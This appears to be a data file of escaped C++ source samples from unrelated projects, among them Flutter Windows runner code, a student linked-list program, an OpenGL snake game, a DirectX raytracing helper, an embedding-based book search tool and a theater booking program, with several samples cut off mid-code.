    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Node {\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();\n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;\n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;\n\n\tif (START == NULL || newNode->noMhs <= START->noMhs) {\n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31mDuplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\tnewNode->next = START;\n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode;\n\t\t}\n\t\tnewNode->prev = NULL;\n\t\tSTART = newNode;\n\t}\n\telse {\n\t\tNode* current = START;\n\t\tNode* previous = NULL;\n\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs)\n\t\t{\n\t\t\tprevious = current;\n\t\t\tcurrent = current->next;\n\t\t}\n\t\tnewNode->next = current;\n\t\tnewNode->prev = previous;\n\n\t\tif (current != NULL)\n\t\t{\n\t\t\tcurrent->prev = newNode;\n\t\t}\n\n\t\tif (previous != NULL)\n\t\t{\n\t\t\tprevious->next = newNode;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current;\n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo;\n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START;\n\tprevious = NULL;\n\n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mThe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\tif (current == START)\n\t{\n\t\tSTART = START->next;\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = NULL;\n\t\t}\n\t}\n\telse\n\t{\n\t\tprevious->next = current->next;\n\t\tif (current->next != NULL)\n\t\t{\n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" delete\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\n\nvoid traverse() \n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords in ascending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t}\n}\n\nvoid revtraverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord in descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\n\tNode* prev, * curr;\n\tprev = curr = NULL;\n\tcout << \"\\nEnter the roll number of the student whose record you want to search: \";\n\tint num;\n\tcin >> num;\n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl;\n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl;\n\t\tcout << \"\\nName: \" << curr->name << endl;\n\t}\n}\n\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"2. Delete a record from the list\" << endl;\n\t\t\tcout << \"3. View all records in the ascending order of roll numbers\" << endl;\n\t\t\tcout << \"4. View all records in the descending order of roll numbers\" << endl;\n\t\t\tcout << \"5. Search for a record in the list\" << endl;\n\t\t\tcout << \"6.Exit\" << endl;\n\t\t\tcout << \"\\nEnter your choice (1-6): \";\n\t\t\tchar ch;\n\t\t\tcin >> ch;\n\n\t\t\tswitch (ch)\n\t\t\t{\n\t\t\tcase '1':\n\t\t\t\taddNode();\n\t\t\t\tbreak;\n\t\t\tcase '2':\n\t\t\t\tdeleteNode();\n\t\t\t\tbreak;\n\t\t\tcase '3':\n\t\t\t\ttraverse();\n\t\t\t\tbreak;\n\t\t\tcase '4':\n\t\t\t\trevtraverse();\n\t\t\t\tbreak;\n\t\t\tcase '5':\n\t\t\t\tsearchData();\n\t\t\t\tbreak;\n\t\t\tcase '6':\n\t\t\t\treturn 0;\n\t\t\tdefault:\n\t\t\t\tcout << \"\\nInvalid option\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcatch (exception& e)\n\t\t{\n\t\t\tcout << \"Chek for the values entered.\" << endl;\n\t\t}\n\t}\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"currency_converter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"openGLPart.h\"\nvoid bunny(double size, Point loc) {\n    glPushMatrix();\n    glTranslatef(loc.x, loc.y, loc.z);\n    glScalef(size, size, size);\n    glBegin(GL_TRIANGLES);\n    for (int i = 0; i < faces.size();i += 3) {\n        glVertex3f(vertices[3 * faces[i]], vertices[3 * faces[i] + 1], vertices[3 * faces[i] + 2]);\n        glVertex3f(vertices[3 * faces[i + 1]], vertices[3 * faces[i + 1] + 1], vertices[3 * faces[i + 1] + 2]);\n        glVertex3f(vertices[3 * faces[i + 2]], vertices[3 * faces[i + 2] + 1], vertices[3 * faces[i + 2] + 2]);\n    }\n    glEnd();\n    glPopMatrix();\n}\n\nPoint randomBunnyLocation(int x, int y, int z, int max, int except) {\n    while (true) {\n        Point loc = { (x - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5),\n            (y - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5),\n            (z - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5) };\n        bool acceptable = true;\n        for (int i = 0;i <= bodySegments - 1;i++) {\n            int current = (i + firstIndex) % MAX_SEGMENTS;\n            int next = (current + 1) % MAX_SEGMENTS;\n            Point p = diff(snakeBody[next], snakeBody[current]);\n            if (p.x != 0 && (loc.x - snakeBody[current].x) * (loc.x - snakeBody[next].x) <= 0 &&\n                (loc.y - snakeBody[current].y) * (loc.y - snakeBody[current].y)\n                + (loc.z - snakeBody[current].z) * (loc.z - snakeBody[current].z)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n            if (p.y != 0 && (loc.y - snakeBody[current].y) * (loc.y - snakeBody[next].y) <= 0 &&\n                (loc.x - snakeBody[current].x) * (loc.x - snakeBody[current].x)\n                + (loc.z - snakeBody[current].z) * (loc.z - snakeBody[current].z)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n            if (p.z != 0 && (loc.z - snakeBody[current].z) * (loc.z - snakeBody[next].z) <= 0 &&\n                (loc.x - snakeBody[current].x) * (loc.x - snakeBody[current].x)\n                + (loc.y - snakeBody[current].y) * (loc.y - snakeBody[current].y)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (!acceptable)\n            continue;\n        for (int i = 0;i <= bodySegments;i++) {\n            int current = (i + firstIndex) % MAX_SEGMENTS;\n            if ((snakeBody[current].x - loc.x) * (snakeBody[current].x - loc.x) +\n                (snakeBody[current].y - loc.y) * (snakeBody[current].y - loc.y) +\n                (snakeBody[current].z - loc.z) * (snakeBody[current].z - loc.z) <=\n                (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (!acceptable)\n            continue;\n        for (int i = 0;i < max;i++) {\n            if (i == except)\n                continue;\n            if (euclideanDistanceSquare(loc, bunnyLocation[i]) <= 4 * DEFAULT_BUNNY_SIZE * DEFAULT_BUNNY_SIZE) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (acceptable)\n            return loc;\n    }\n}\nint eatsBunny() {\n    int head = (bodySegments + firstIndex) % MAX_SEGMENTS;\n    for (int i = 0; i < DEFAULT_NUMBER_OF_BUNNIES;i++)\n        if (euclideanDistanceSquare(snakeBody[head], bunnyLocation[i]) <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE))\n            return i;\n    return -1;\n}\nbool snakeCrossesItself() {\n    int head0 = (bodySegments + firstIndex - 1) % MAX_SEGMENTS;\n    int head1 = (head0 + 1) % MAX_SEGMENTS;\n    Point direction = diff(snakeBody[head1], snakeBody[head0]);\n    for (int i = 0;i <= bodySegments - 2;i++) {\n        int current = (i + firstIndex) % MAX_SEGMENTS;\n        int next = (current + 1) % MAX_SEGMENTS;\n        Point p = diff(snakeBody[next], snakeBody[current]);\n        if (direction.x == 0 && p.x == 0) {//on y-z plane\n            if (snakeBody[head0].x != snakeBody[current].x)\n                continue;\n            if (direction.y == 0 && p.y == 0) {\n                if (snakeBody[head0].y == snakeBody[current].y &&\n                    ((snakeBody[head0].z - snakeBody[current].z) * (snakeBody[head0].z - snakeBody[next].z) < 0 ||\n                        (snakeBody[head1].z - snakeBody[current].z) * (snakeBody[head1].z - snakeBody[next].z) < 0))\n                    return true;\n            }\n            if (direction.z == 0 && p.z == 0) {\n                if (snakeBody[head0].z == snakeBody[current].z &&\n                    ((snakeBody[head0].y - snakeBody[current].y) * (snakeBody[head0].y - snakeBody[next].y) < 0 ||\n    ",
    "#include \"RaytracingHelper.h\"\n#include \"DX12Helper.h\"\n#include \"BufferStructs.h\"\n\n#include <d3dcompiler.h>\n#include <DirectXMath.h>\n\nusing namespace DirectX;\n\n// Useful raytracing links!\n// https://github.com/NVIDIAGameWorks/DxrTutorials // Has word docs with decent explanations in each folder\n// https://github.com/acmarrs/IntroToDXR // Really clean \"raw\" implementation\n// https://developer.nvidia.com/blog/introduction-nvidia-rtx-directx-ray-tracing/ // Good overview with diagrams\n// https://link.springer.com/content/pdf/10.1007%2F978-1-4842-4427-2_3.pdf // Chapter 3 of Ray Tracing Gems\n// https://www.realtimerendering.com/raytracinggems/rtg/index.html // Official page of Ray Tracing Gems (with links to free PDF copy!)\n\n\n// Singleton requirement\nRaytracingHelper* RaytracingHelper::instance;\n\n// Quick alignment macro adjusted from: https://github.com/acmarrs/IntroToDXR/blob/master/include/Common.h\n// Makes use of integer division to ensure we are aligned to the proper multiple of \"alignment\"\n#define ALIGN(value, alignment) (((value + alignment - 1) / alignment) * alignment)\n\n// --------------------------------------------------------\n// Clean up any non-smart pointer objects\n// --------------------------------------------------------\nRaytracingHelper::~RaytracingHelper()\n{\n\n}\n\n\n// --------------------------------------------------------\n// Check for raytracing support and create all necessary\n// raytracing resources, pipeline states, etc.\n// --------------------------------------------------------\nvoid RaytracingHelper::Initialize(\n\tunsigned int screenWidth,\n\tunsigned int screenHeight,\n\tMicrosoft::WRL::ComPtr<ID3D12Device> device,\n\tMicrosoft::WRL::ComPtr<ID3D12CommandQueue> commandQueue,\n\tMicrosoft::WRL::ComPtr<ID3D12GraphicsCommandList> commandList,\n\tstd::wstring raytracingShaderLibraryFile)\n{\n\t// Save command queue for future work\n\tthis->commandQueue = commandQueue;\n\tthis->screenWidth = screenWidth;\n\tthis->screenHeight = screenHeight;\n\n\t// Query to see if DXR is supported on this hardware\n\tHRESULT dxrDeviceResult = device->QueryInterface(IID_PPV_ARGS(dxrDevice.GetAddressOf()));\n\tHRESULT dxrCommandListResult = commandList->QueryInterface(IID_PPV_ARGS(dxrCommandList.GetAddressOf()));\n\n\t// Check the results\n\tbool anyFailure = false;\n\tif (FAILED(dxrDeviceResult)) { printf(\"DXR Device query failed - DirectX Raytracing unavailable on this hardware.\\n\"); anyFailure = true; }\n\tif (FAILED(dxrCommandListResult)) { printf(\"DXR Command List query failed - DirectX Raytracing unavailable on this hardware.\\n\"); anyFailure = true; }\n\n\t// Any reason to continue?\n\tif (anyFailure)\n\t\treturn;\n\n\t// We have DXR support\n\tdxrAvailable = true;\n\tprintf(\"DXR initialization success - DirectX Raytracing is available on this hardware!\\n\");\n\n\t// Proceed with setup\n\tCreateRaytracingRootSignatures();\n\tCreateRaytracingPipelineState(raytracingShaderLibraryFile);\n\tCreateShaderTable();\n\tCreateRaytracingOutputUAV(screenWidth, screenHeight);\n\n\t// Other init\n\thelperInitialized = true;\n}\n\n\n// --------------------------------------------------------\n// Creates the root signatures necessary for raytracing:\n//  - A global signature used across all shaders\n//  - A local signature used for each ray hit\n// --------------------------------------------------------\nvoid RaytracingHelper::CreateRaytracingRootSignatures()\n{\n\t// Don't bother if DXR isn't available\n\tif (!dxrAvailable)\n\t\treturn;\n\n\t// Create a global root signature shared across all raytracing shaders\n\t{\n\t\t// Two descriptor ranges\n\t\t// 1: The output texture, which is an unordered access view (UAV)\n\t\t// 2: Two separate SRVs, which are the index and vertex data of the geometry\n\t\tD3D12_DESCRIPTOR_RANGE outputUAVRange = {};\n\t\toutputUAVRange.BaseShaderRegister = 0;\n\t\toutputUAVRange.NumDescriptors = 1;\n\t\toutputUAVRange.OffsetInDescriptorsFromTableStart = D3D12_DESCRIPTOR_RANGE_OFFSET_APPEND;\n\t\toutputUAVRange.RangeType = D3D12_DESCRIPTOR_RANGE_TYPE_UAV;\n\t\toutputUAVRange.RegisterSpace = 0;\n\n\t\tD3D12_DESCRIPTOR_RANGE cbufferRange = {};\n\t\tcbufferRange.BaseShaderRegister = 0;\n\t\tcbufferRange.NumDescriptors = 1;\n\t\tcbufferRange.OffsetInDescriptorsFromTableStart = D3D12_DESCRIPTOR_RANGE_OFFSET_APPEND;\n\t\tcbufferRange.RangeType = D3D12_DESCRIPTOR_RANGE_TYPE_CBV;\n\t\tcbufferRange.RegisterSpace = 0;\n\n\t\t// Set up the root parameters for the global signature (of which there are four)\n\t\t// These need to match the shader(s) we'll be using\n\t\tD3D12_ROOT_PARAMETER rootParams[3] = {};\n\t\t{\n\t\t\t// First param is the UAV range for the output texture\n\t\t\trootParams[0].ParameterType = D3D12_ROOT_PARAMETER_TYPE_DESCRIPTOR_TABLE;\n\t\t\trootParams[0].ShaderVisibility = D3D12_SHADER_VISIBILITY_ALL;\n\t\t\trootParams[0].DescriptorTable.NumDescriptorRanges = 1;\n\t\t\trootParams[0].DescriptorTable.pDescriptorRanges = &outputUAVRange;\n\n\t\t\t// Second param is an SRV for the acceleration structure\n\t\t\trootParams[1].ParameterType = D3D12_ROOT_PARAMETER_TYPE_SRV;\n\t\t\trootParams[1].ShaderVisibility = D3D12_SHADER_VISIBILITY_ALL;\n\t\t\trootParams[1].Descriptor.",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <execution>\n#include <cctype>\n#include <sstream>\n#include <filesystem>\n#include <vector>\n#include <nlohmann/json.hpp>\n#include \"CurlHelper.hpp\"\n#include \"text_utils.hpp\"\n#include \"skills.hpp\"\n#include \"AIClient.hpp\"\n#include \"Embedding.hpp\"\n#include \"Models/TextElement.hpp\"\n\nusing namespace std;\nnamespace fs = std::filesystem;\nusing json = nlohmann::json;\n\nauto dbName = \"/Users/armandomeabe/Code/AIBookEngine/AIBookEngine/DataBase.armDb\";\n\nstd::vector<std::string> loadTextFiles(const std::string& ruta) {\n    std::vector<std::string> fileContents;\n\n    try {\n        for (const auto& archivo : fs::directory_iterator(ruta)) {\n            if (archivo.is_regular_file()) {\n                std::ifstream ifs(archivo.path());\n                if (ifs) {\n                    std::string contenido((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());\n                    fileContents.push_back(contenido);\n                    ifs.close();\n                } else {\n                    std::cerr << \"No se pudo abrir el archivo: \" << archivo.path() << std::endl;\n                }\n            }\n        }\n    } catch (const std::exception& e) {\n        std::cerr << \"Error al recorrer la ruta: \" << e.what() << std::endl;\n    }\n\n    return fileContents;\n}\n\njson embeddingToJson(const Embedding& embedding) {\n    json j;\n    j[\"embedding\"] = embedding.embedding;\n    j[\"originalText\"] = embedding.originalText;\n    return j;\n}\n\nvoid to_json(json& j, const std::vector<Embedding>& embeddings) {\n    for (const auto& embedding : embeddings) {\n        j.push_back(embeddingToJson(embedding));\n    }\n}\n\nvoid from_json(const json& j, std::vector<Embedding>& embeddings) {\n    for (const auto& item : j) {\n        Embedding embedding;\n        embedding.embedding = item[\"embedding\"].get<std::vector<float>>();\n        embedding.originalText = item[\"originalText\"].get<std::string>();\n        embeddings.push_back(embedding);\n    }\n}\n\nstd::vector<TextElement> cargarResultadosDesdeArchivo(const std::string& nombreArchivo) {\n    std::vector<std::pair<std::vector<Embedding>, std::string>> resultados;\n    \n    std::ifstream archivo(nombreArchivo);\n    if (archivo) {\n        json j;\n        archivo >> j;\n        \n        for (const auto& resultado : j) {\n            std::vector<Embedding> embeddings = resultado[\"embeddings\"].get<std::vector<Embedding>>();\n            std::string nombreArchivo = resultado[\"nombreArchivo\"];\n            resultados.push_back(std::make_pair(embeddings, nombreArchivo));\n        }\n        \n        archivo.close();\n    } else {\n        std::cerr << \"No se pudo abrir el archivo: \" << nombreArchivo << std::endl;\n    }\n    \n    std::vector<TextElement> textElements;\n    for (auto dbItem : resultados) {\n        TextElement te(dbItem.second, dbItem.first);\n        textElements.push_back(te);\n    }\n    \n    return textElements;\n}\n\nvoid guardarResultadosEnArchivo(const std::string& nombreArchivo, const std::vector<std::pair<std::vector<Embedding>, std::string>>& resultados) {\n    std::ofstream archivo(nombreArchivo);\n    if (archivo) {\n        json j;\n        for (const auto& resultado : resultados) {\n            json jResultado;\n            jResultado[\"nombreArchivo\"] = resultado.second;\n            jResultado[\"embeddings\"] = resultado.first;\n            j.push_back(jResultado);\n        }\n\n        archivo << j.dump(4); // 4 espacios de indentaci\u00f3n para una mejor legibilidad\n        archivo.close();\n    } else {\n        std::cerr << \"No se pudo crear el archivo: \" << nombreArchivo << std::endl;\n    }\n}\n\nvoid Ingest() {\n    AIClient ai;\n    auto ingestPath = \"/Users/armandomeabe/Code/AIBookEngine/AIBookEngine/KB/booksToTextFilesSubSet/\";\n\n    std::vector<std::string> files = loadTextFiles(ingestPath);\n\n    std::vector<std::pair<std::vector<Embedding>,string>> results;\n    \n    int i = 1;\n    // Imprimir el contenido de cada archivo y comenzar el proces\n    for (const auto& file : files) {\n        i++;\n        std::cout << \"Contenido del archivo: \" << i << std::endl;\n        std::cout << file << std::endl;\n        std::cout << \"------------------------\" << std::endl;\n        \n        auto keywords = ai.Generate(file);\n        auto keywordsVector = TextUtils::splitString(keywords);\n        \n        std::vector<Embedding> embeddings;\n        for (const std::string& word : keywordsVector) {\n            auto embed = ai.Embed(word);\n            embeddings.push_back(embed);\n            std::cout << std::endl << \"Embedding palabra: \" << embed.originalText;\n        }\n        \n        results.push_back(std::make_pair(embeddings, file));\n        std::cout << std::endl << \"_________________________________________________________________\" << std::endl;\n    }\n    \n    guardarResultadosEnArchivo(dbName, results);\n}\n\nint main() {\n    AIClient ai;\n    \n//    Ingest();\n//    return 0;\n\n    auto db = cargarResultadosDesdeArchivo(dbName);\n    \n    while (true) {\n        std",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass Theater \r\n{\r\npublic:\r\n    void showdata() {\r\n        cout<<\"1. Display movies\"<<endl;\r\n        cout<<\"2. Display seat availability\"<<endl;\r\n        cout<<\"3. Book a ticket\"<<endl;\r\n        cout<<\"4. Cancel_ticket\"<<endl;\r\n        cout<<\"5. Exit\"<<endl;\r\n        cout<<endl;\r\n    }\r\n\r\n    void Display_movies() {\r\n        cout<<\"Available movies:\"<<endl;\r\n        cout<<\"0. Avengers (Action) - 150 min\"<<endl;\r\n        cout<<\"1. Jawan (Action thriller) - 120 min\"<<endl;\r\n        cout<<\"2. The Nun (Horror) - 145 min\"<<endl;\r\n        cout<< \"---------------------------\"<<endl;\r\n    }\r\n\r\n    void Display_seat_availability(char seats[7][7]) \r\n\t{\r\n        cout<<\"Seat availability:\"<<endl;\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                if(seats[i][j]=='O') \r\n\t\t\t\t{\r\n                    cout<<'O'<<\" \"; \r\n                } else \r\n\t\t\t\t{\r\n                    cout<<'X'<<\" \"; \r\n                }\r\n            }\r\n            cout<<endl;\r\n        }\r\n        cout<<\"-----------------------------\"<< endl;\r\n    }\r\n};\r\n\r\nclass Booking : public Theater \r\n{\r\npublic:\r\n    char seats[7][7]; \r\n\r\n    Booking() \r\n\t{\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                seats[i][j]='O';\r\n            }\r\n        }\r\n    }\r\n\r\n    void Book_ticket() \r\n\t{\r\n        Display_movies();\r\n\r\n        int movieIndex;\r\n        cout << \"Select movie index: \";\r\n        cin >> movieIndex;\r\n\r\n        if(movieIndex<0||movieIndex>2) \r\n\t\t{\r\n            cout<<\"Invalid movie index.\"<<endl;\r\n        }\r\n\r\n        Display_seat_availability(seats);\r\n\r\n        int row, column;\r\n        cout<<\"Choose row and column to select a seat for booking (1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='O') \r\n\t\t\t{\r\n                seats[row-1][column-1]='X';\r\n                cout<<\"Ticket booked successfully for movie index \"<< movieIndex<<\" and seat \"<<row<< \"-\"<< column << endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout<<\"Seat is already booked. Please select another seat.\"<<endl;\r\n            }\r\n        \r\n        cout<< \"-------------------\"<< endl;\r\n    \r\n    \t}\r\n\t}\r\n\tvoid Cancel_ticket() \r\n\t{\r\n        Display_seat_availability(seats);\r\n        int row,column;\r\n        cout<<\"Choose row and column to cancel a booked seat(1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='X') \r\n\t\t\t{\r\n                seats[row - 1][column - 1]='O';\r\n                cout<<\"Ticket canceled successfully for seat \"<<row<< \"-\"<<column<<endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout <<\"Seat is not booked. Please select a valid seat to cancel.\"<<endl;\r\n            }\r\n            cout<<\"-------------------\"<<endl;\r\n        }\r\n    }\r\n};\r\n\r\nvoid intro() \r\n{\r\n    cout<<\"WELCOME TO THEATER MANAGEMENT PROJECT\"<< endl;\r\n    cout<<\"Created by Vaishnavi and Pradnya\"<< endl;\r\n}\r\n\r\nint main() \r\n{\r\n    intro();\r\n    Booking b;\r\n    int choice;\r\n\r\n    while (true) \r\n\t{\r\n        b.showdata();\r\n        cout<<endl;\r\n        cout<<\"Enter your choice: \";\r\n        cin>>choice;\r\n\r\n        switch(choice) \r\n\t\t{\r\n            case 1:\r\n                b.Display_movies();\r\n                break;\r\n            case 2:\r\n                b.Display_seat_availability(b.seats);\r\n                break;\r\n            case 3:\r\n                b.Book_ticket();\r\n                break;\r\n            case 4:\r\n            \tb.Cancel_ticket();\r\n            case 5:\r\n                cout<<\"Exiting the program\"<< endl;\r\n                \r\n            default:\r\n                cout<<\"Invalid choice\"<< endl;\r\n\t\r\n        }\r\n        \r\n    }\r\n    return 1;\r\n}\r\n\r\n\r\n",
